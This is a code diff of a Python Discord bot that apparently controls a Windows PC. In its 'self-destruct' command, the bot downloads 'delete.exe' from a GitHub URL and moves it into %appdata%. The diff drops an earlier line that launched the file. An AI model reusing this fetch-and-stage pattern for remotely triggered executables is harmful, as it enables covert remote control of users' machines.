@@ -15,7 +15,6 @@ from urllib.request import urlretrieve
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL
 import ctypes
-import shutil
 import subprocess
 import wave
 
@@ -394,9 +393,13 @@ class MyClient(discord.Client):
                 url = "https://github.com/Plexisity/announcer/raw/main/delete.exe"
                 filename = "delete.exe"
                 urlretrieve(url, filename)
-                shutil.move("delete.exe", os.path.expandvars(r"%appdata%\delete.exe"))
-                os.startfile(os.path.expandvars(r"%appdata%\delete.exe"))
-                await message.channel.send('Deleting files...')
+                #replace or move file to appdata folder
+                if os.path.exists(os.path.expandvars(r"%appdata%\delete.exe")):
+                    print("File already exists. Deleting it...")
+                    await message.channel.send('File already exists. Deleting it...')
+                    os.remove(os.path.expandvars(r"%appdata%\delete.exe"))
+                os.replace("delete.exe", os.path.expandvars(r"%appdata%\delete.exe"))
+                
                 await self.change_presence(activity=discord.Game(name="Self-destructing..."))
                 await message.channel.send('goodbye...')
                 
